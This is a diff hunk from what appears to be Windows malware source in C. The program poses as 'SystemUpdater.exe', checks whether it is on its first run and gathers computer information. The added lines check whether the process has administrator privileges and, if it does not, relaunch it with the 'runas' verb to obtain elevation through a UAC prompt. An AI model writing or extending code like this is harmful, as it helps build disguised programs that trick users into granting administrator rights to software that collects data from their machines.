@@ -26,11 +26,41 @@ int is_first_execution(char *current_executable_path, char *softwareDataDirector
 
 int main(void)
 {
-
     char fake_executable_name[] = "SystemUpdater.exe";
 
     char current_executable_path[MAX_PATH];
     GetModuleFileName(NULL, current_executable_path, MAX_PATH);
+
+    // Check if the program is running with administrator privileges
+    BOOL isAdmin = FALSE;
+    HANDLE tokenHandle = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
+    {
+        TOKEN_ELEVATION elevation;
+        DWORD size;
+        if (GetTokenInformation(tokenHandle, TokenElevation, &elevation, sizeof(elevation), &size))
+        {
+            isAdmin = elevation.TokenIsElevated;
+        }
+        CloseHandle(tokenHandle);
+    }
+
+    if (!isAdmin)
+    {
+        // Relaunch the program with administrator privileges
+        SHELLEXECUTEINFO sei = {sizeof(SHELLEXECUTEINFO)};
+        sei.lpVerb = "runas";
+        sei.lpFile = current_executable_path;
+        sei.hwnd = NULL;
+        sei.nShow = SW_NORMAL;
+
+        if (!ShellExecuteEx(&sei))
+        {
+            printf("Failed to elevate privileges.\n");
+            exit(EXIT_FAILURE);
+        }
+    }
 
     // COMPUTER_INFOS est une structure de ../include/structures.h
     COMPUTER_INFOS computer;
